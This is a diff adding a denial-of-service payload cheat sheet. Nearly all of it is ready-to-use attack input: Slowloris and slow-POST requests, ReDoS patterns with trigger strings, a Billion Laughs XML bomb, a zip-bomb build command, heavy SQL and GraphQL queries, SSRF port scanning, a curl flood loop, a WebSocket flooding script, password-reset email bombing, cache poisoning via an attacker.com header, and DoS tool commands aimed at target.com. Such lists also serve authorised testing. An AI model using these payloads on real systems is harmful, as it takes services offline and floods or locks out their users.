@@ -1,0 +1,238 @@
+# Denial of Service (DOS) Payloads
+
+## ========================================
+## APPLICATION LAYER DOS
+## ========================================
+
+# Slowloris attack
+Send partial HTTP requests
+Keep connections open
+Exhaust server connection pool
+
+# Slow POST
+POST /upload HTTP/1.1
+Content-Length: 999999999
+[Send data very slowly]
+
+# R.U.D.Y (Slow Read)
+GET / HTTP/1.1
+[Read response very slowly]
+
+## ========================================
+## REGEX DOS (ReDOS)
+## ========================================
+
+# Evil regex patterns
+(a+)+b
+(a|a)*b
+(a|ab)*c
+
+# Test payload
+aaaaaaaaaaaaaaaaaaaaaaaaaaab
+
+# Email regex DOS
+^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$
+Input: aaaaaaaaaaaaaaaaaaaaaaaa!
+
+## ========================================
+## XML BOMB (BILLION LAUGHS)
+## ========================================
+
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+
+## ========================================
+## ZIP BOMB
+## ========================================
+
+# Create zip bomb
+dd if=/dev/zero bs=1M count=10000 | zip zip_bomb.zip -
+
+# Nested compression
+42.zip (expands to 4.5 petabytes)
+
+## ========================================
+## ALGORITHMIC COMPLEXITY
+## ========================================
+
+# Hash collision DOS
+POST /login
+username=a&password=b&password=c&password=d...
+[Send thousands of parameters with same name]
+
+# JSON DOS
+{"a": {"b": {"c": {"d": ... }}}}
+[Deeply nested JSON]
+
+## ========================================
+## RESOURCE EXHAUSTION
+## ========================================
+
+# Large file upload
+POST /upload
+Content-Length: 999999999999
+[Upload huge file]
+
+# Memory exhaustion
+GET /search?q=*
+[Return all results]
+
+# CPU exhaustion
+GET /calculate?iterations=999999999
+
+## ========================================
+## RECURSIVE DOS
+## ========================================
+
+# Infinite recursion
+/redirect?url=/redirect?url=/redirect?url=...
+
+# Circular reference
+{"user": {"friend": {"friend": ... }}}
+
+## ========================================
+## GRAPHQL DOS
+## ========================================
+
+# Deep nesting
+{
+  user {
+    posts {
+      comments {
+        user {
+          posts {
+            comments {
+              # ... repeat
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+# Field duplication
+{
+  user1: user(id: 1) { posts { ... } }
+  user2: user(id: 2) { posts { ... } }
+  # ... repeat 1000s of times
+}
+
+## ========================================
+## SQL DOS
+## ========================================
+
+# Heavy query
+SELECT * FROM users WHERE 1=1 OR SLEEP(10)
+SELECT COUNT(*) FROM users CROSS JOIN users
+
+# Cartesian product
+SELECT * FROM t1, t2, t3, t4, t5
+
+## ========================================
+## SSRF DOS
+## ========================================
+
+# Internal port scan
+?url=http://localhost:1
+?url=http://localhost:2
+[Scan all 65535 ports]
+
+# Timeout exploitation
+?url=http://very-slow-server.com
+
+## ========================================
+## RATE LIMIT EXHAUSTION
+## ========================================
+
+# Account lockout
+POST /login
+[Try wrong password 1000 times]
+
+# API quota exhaustion
+for i in {1..10000}; do
+  curl http://api.target.com/endpoint
+done
+
+## ========================================
+## EMAIL BOMBING
+## ========================================
+
+# Password reset spam
+POST /forgot-password
+email=victim@example.com
+[Send 1000s of reset emails]
+
+## ========================================
+## CACHE POISONING DOS
+## ========================================
+
+# Poison cache with error
+GET /?error=true HTTP/1.1
+X-Forwarded-Host: attacker.com
+
+## ========================================
+## WEBSOCKET DOS
+## ========================================
+
+# Message flooding
+var ws = new WebSocket('ws://target.com');
+for(let i=0; i<100000; i++) {
+  ws.send('x'.repeat(1000000));
+}
+
+## ========================================
+## NULL BYTE DOS
+## ========================================
+
+# Null byte in request
+GET /%00%00%00%00 HTTP/1.1
+
+## ========================================
+## PIXEL FLOOD
+## ========================================
+
+# Image processing DOS
+Upload 100000x100000 pixel image
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Slowloris
+slowloris -s 500 target.com
+
+# HULK
+python hulk.py target.com
+
+# GoldenEye
+goldeneye.py http://target.com
+
+# Load testing (legitimate)
+ab -n 10000 -c 100 http://target.com/
+
+## ========================================
+## TESTING
+## ========================================
+
+# Test regex
+Time: /^(a+)+$/
+Input: aaaaaaaaaaaaaaaaaaaaaa!
+
+# Test upload
+Upload 10GB file
+
+# Test query
+Search for "*" or empty string
